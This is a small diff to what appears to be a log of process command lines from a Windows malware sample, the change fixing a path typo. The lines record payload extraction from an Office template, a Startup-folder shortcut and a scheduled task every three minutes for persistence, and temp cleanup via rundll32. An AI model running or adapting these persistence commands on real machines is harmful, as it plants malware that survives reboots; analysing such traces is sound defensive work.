@@ -13,7 +13,7 @@ find /I /N "psuaservice.exe"
 findstr /V /R "^YbeRstbFtOUDIqBrtdMHJUtzjhOkoKZFTdVtvyDmPFkahUrGQWaXBcArzIFrfkvxPgKsybGZNhRtJLyalocksetbQRLOA$" Ritornata.potm
 Fino.exe.pif t
 cmd /c echo [InternetShortcut] > "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PJDKIgRDMm.url" & echo URL="C:\Users\user\AppData\Local\Temp\zqNDtAgMrV\Xtxsjgzcb.vbs" >> "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PJDKIgRDMm.url"
-schtasks.exe /create /tn "Puoi" /tr "C:\Users\user\\AppData\Local\Temp\zqNDtAgMrV\PJDKIgRDMm.exe.com C:\Users\user\AppData\Local\Temp\zqNDtAgMrV\z" /sc minute /mo 3 /F
+schtasks.exe /create /tn "Puoi" /tr "C:\Users\user\AppData\Local\Temp\zqNDtAgMrV\PJDKIgRDMm.exe.com C:\Users\user\AppData\Local\Temp\zqNDtAgMrV\z" /sc minute /mo 3 /F
 C:\Windows\system32\rundll32.exe" C:\Windows\system32\advpack.dll,DelNodeRunDLL32 "C:\Users\user\AppData\Local\Temp\IXP000.TMP\
 C:\Users\user\AppData\Local\Temp\zqNDtAgMrV\PJDKIgRDMm.exe.com z
 C:\Users\user\AppData\Local\Temp\zqNDtAgMrV\PJDKIgRDMm.exe.com C:\Users\user\AppData\Local\Temp\zqNDtAgMrV\z 
